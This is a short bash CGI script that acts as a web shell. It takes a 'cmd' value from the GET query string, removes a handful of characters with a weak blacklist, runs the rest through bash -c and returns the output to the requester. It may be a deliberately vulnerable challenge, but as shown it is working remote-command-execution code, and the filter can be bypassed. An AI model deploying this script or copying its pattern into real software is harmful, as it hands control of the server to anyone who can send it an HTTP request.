#!/usr/bin/env bash
echo "Content-type: text/html"
echo ""

echo "$REQUEST_METHOD"
echo "$QUERY_STRING"

if [ "$REQUEST_METHOD" != "GET" ]; then
    exit 1
fi

if [ -z "$QUERY_STRING" ]; then
    exit 0
else
    cmd=`echo "$QUERY_STRING" | sed -n 's/^.*cmd=\([^&;]*\).*$/\1/p' | sed "s/%20/ /g" | sed -E 's/[$|<>&*?.()\/]//g'`
    echo $cmd
    answer=`bash -c "$cmd"`
    echo $answer
fi
